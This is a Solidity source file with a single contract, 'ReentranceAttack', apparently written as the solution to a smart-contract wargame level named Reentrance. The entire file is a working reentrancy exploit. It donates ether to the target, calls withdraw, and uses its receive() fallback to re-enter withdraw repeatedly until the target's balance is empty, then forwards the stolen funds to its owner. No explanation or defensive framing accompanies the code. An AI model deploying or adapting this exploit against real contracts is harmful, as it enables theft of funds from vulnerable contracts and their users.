// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceAttack {
    IReentrance public target;
    address payable owner;

    constructor(address _target) {
        target = IReentrance(_target);
        owner = payable(msg.sender);
    }

    function attack() external payable {
        require(msg.value >= 0.001 ether, "Need some ether");

        target.donate{value: msg.value}(address(this));

        target.withdraw(msg.value);
    }

    receive() external payable {
        uint256 balance = address(target).balance;
        if (balance > 0) {
            uint256 toWithdraw = balance >= 0.001 ether ? 0.001 ether : balance;
            target.withdraw(toWithdraw);
        } else {
            owner.transfer(address(this).balance);
        }
    }
}
